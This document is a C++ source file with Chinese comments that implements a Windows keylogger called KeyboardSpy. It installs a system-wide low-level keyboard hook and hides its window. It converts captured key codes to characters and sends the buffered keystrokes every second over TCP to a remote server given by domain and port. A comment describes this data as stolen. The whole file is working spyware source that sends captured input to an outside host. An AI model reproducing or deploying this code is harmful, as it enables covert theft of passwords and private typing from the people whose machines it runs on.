﻿#include "KeyboardSpy.h"

// 互挤体，用来确保线程安全
static CRITICAL_SECTION gCs;
//// 初始化类
//static KeyboardSpy spy;
// 窗口句柄
static HWND hWnd = NULL;
// 键盘钩子句柄
static HHOOK gHHook = NULL;

static TcpSocket* g_sock;
//// socket列表
//static std::vector<TcpSocket*> gSockets;
// 键盘数据缓存区
static std::vector<char> gBuffer;

KeyboardSpy::KeyboardSpy()
{
    // 初始化互挤体
    InitializeCriticalSection(&gCs);


}

KeyboardSpy::~KeyboardSpy()
{
    if (hWnd) {
        // 关闭计时器
        KillTimer(hWnd, 0);

        //// 删除socket
        //const int max = gSockets.size();
        //for (int i = 0; i < max; ++i) {
        //    gSockets.at(i)->dissconnect();
        //    delete gSockets.at(i);
        //}

        // 关闭窗口
        DestroyWindow(hWnd);

        // 移除键盘监控
        if (gHHook) {
            uninstallKeyboardHook(gHHook);
        }
    }

    // 删除互挤体
    DeleteCriticalSection(&gCs);
}

void KeyboardSpy::startKeyboardSpy(std::string domain, int port)
{
    g_sock = new TcpSocket();
    if (!g_sock->connectTo(domain, port)) {
        // 释放socket
        delete g_sock;

        std::cout << "Failed to connect server for keyboard spy" << std::endl;
        std::fflush(stdout);
        return;
    }

    // 创建一个对话框来处理win32事件
    createDialogByNewThread();

    // 输出信息
    std::cout << "Started keyboard spy success" << std::endl;
    std::fflush(stdout);
}

void KeyboardSpy::createDialogByNewThread()
{
    // 启动一个新线程来做监控
    HANDLE h = CreateThread(NULL, 0, KeyboardSpy::threadProc, (LPVOID)NULL, 0, NULL);
    if (!h) {
        std::cout << "Failed to create new thread" << std::endl;
        std::fflush(stdout);
    }
}

DWORD KeyboardSpy::threadProc(LPVOID)
{
    // 定义对话框模板
    WORD tempMem[1024] = { 0 };
    LPDLGTEMPLATE temp = (LPDLGTEMPLATE)tempMem;

    // 设置对话框模板字段
    temp->style = WS_CAPTION | WS_SYSMENU | DS_CENTER; // 窗口样式
    temp->dwExtendedStyle = 0;                         // 扩展样式
    temp->cdit = 0;                                    // 对话框中控件个数
    temp->x = 10; temp->y = 10;                        // 对话框左上角坐标
    temp->cx = 100; temp->cy = 100;                    // 对话框宽度和高度

    // 创建对话框
    int ret = DialogBoxIndirectParamA(
        NULL,                           // 模块实例句柄，NULL 表示使用当前模块
        temp,                           // 模板指针
        NULL,                           // 父窗口句柄
        keyboardSpyWndProc,             // 回调函数
        (LPARAM)NULL                    // 传递的参数
    );
    if (ret == -1) {
        std::cout << "Failed to create dialog box for keyboard spy" << std::endl;
        std::fflush(stdout);
    }

    return true;
}

INT_PTR KeyboardSpy::keyboardSpyWndProc(HWND hWnd, UINT uiMsg, WPARAM, LPARAM)
{
    switch (uiMsg) {
        // 初始化监控
    case WM_INITDIALOG: {
        std::cout << "WM_INITDIALOG" << std::endl;
        std::fflush(stdout);

        // 定时发送窃取的数据
        const int time = 1000;  // 我这里设置1秒发送一次，你可以设置你自己想要的
        SetTimer(hWnd, 0, time, (TIMERPROC)sendKeyboardData);

        // 安装键盘钩子来截取系统的所有键盘输入
        gHHook = installKeyboardHook();
        if (!gHHook) {
            std::cout << "Failed to install keyboard hook" << std::endl;
            std::fflush(stdout);
        }

        break;
    }
    case WM_PAINT:
        // 隐藏窗口
        ShowWindow(hWnd, SW_HIDE);
        break;
    default:
        break;
    }

    return false;
}

HHOOK KeyboardSpy::installKeyboardHook()
{
    return SetWindowsHookExA(13, keyboardHookProc, GetModuleHandleA(NULL), 0);
}

void KeyboardSpy::uninstallKeyboardHook(HHOOK hHook)
{
    UnhookWindowsHookEx(hHook);
}

LRESULT KeyboardSpy::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (wParam == WM_KEYDOWN)
    {
        HookStruct* hs = (HookStruct*)lParam;
        char data = hs->iCode;

        // 我这里只识别了常用的键盘，你如果想分析更多的话你可以自己重写这里，
        // 转换键盘虚拟码，你兴趣修改可以参考：http://www.cnblogs.com/del/archive/2007/12/07/987364.html。
        bool isCapital = GetKeyState(VK_CAPITAL);
        if (hs->iCode >= 'A' && hs->iCode <= 'Z' && !isCapital) {
            // 判断是否大写，如果不是就把原本大写的字符变小写
            data = data + 0x20;
        }
        else if (hs->iCode >= 0x60 && hs->iCode <= 0x69) {
            // 小键盘
            data = data - 0x30;
        }
        else {
            // 符号
            switch (hs->iCode) {
            case 106: data = '*'; break;
            case 107: data = '+'; break;
            case 109: data = '-';   break;
            case 110: data = '.'; break;
            case 111: data = '/'; break;
            case 186: data = ';'; break;
            case 187: data = '='; break;
            case 188: data = ','; break;
            case 189: data = '-'; break;
            case 190: data = '.'; break;
            case 191: data = '/'; break;
            case 192: data = '`'; break;
            case 219: data = '['; break;
            case 220: data = '\\'; break;
            case 221: data = ']'; break;
            case 222: data = '\''; break;
            }
        }

        // 把键盘数据加到缓冲区
        addBuffer(data);
    }

    return CallNextHookEx(gHHook, nCode, wParam, lParam);
}

//void KeyboardSpy::addSocket(TcpSocket* sock)
//{
//    // 锁定函数，其他线程不能进来
//    EnterCriticalSection(&gCs);
//
//    gSockets.push_back(sock);
//
//    // 解除函数锁定
//    LeaveCriticalSection(&gCs);
//}
//
//std::vector<TcpSocket*> KeyboardSpy::getSockets()
//{
//    // 锁定函数，其他线程不能进来
//    EnterCriticalSection(&gCs);
//
//    std::vector<TcpSocket*> sockets = gSockets;
//
//    // 解除函数锁定
//    LeaveCriticalSection(&gCs);
//
//    return sockets;
//}
//
//void KeyboardSpy::delSocket(TcpSocket* sock)
//{
//    // 锁定函数，其他线程不能进来
//    EnterCriticalSection(&gCs);
//
//    std::vector<TcpSocket*>::iterator iter = gSockets.begin();
//    for (; iter != gSockets.end(); ++iter) {
//        if (*iter == sock) {
//            gSockets.erase(iter);
//            break;
//        }
//    }
//
//    // 解除函数锁定
//    LeaveCriticalSection(&gCs);
//}

void KeyboardSpy::addBuffer(char data)
{
    gBuffer.push_back(data);
}

void KeyboardSpy::delBuffer()
{
    gBuffer.clear();
}

void KeyboardSpy::sendKeyboardData(HWND, UINT, UINT, DWORD)
{
	// 遍历所有已经连接的端口来发送键盘数据
	if (gBuffer.size() > 0) {


		if (!g_sock->sendData(gBuffer.data(), gBuffer.size())) {


			// 释放socket
			delete g_sock;

			// 输出信息
			std::cout << "Finished keyboard spy" << std::endl;
		}
	}

	// 清空缓冲区
	delBuffer();
}

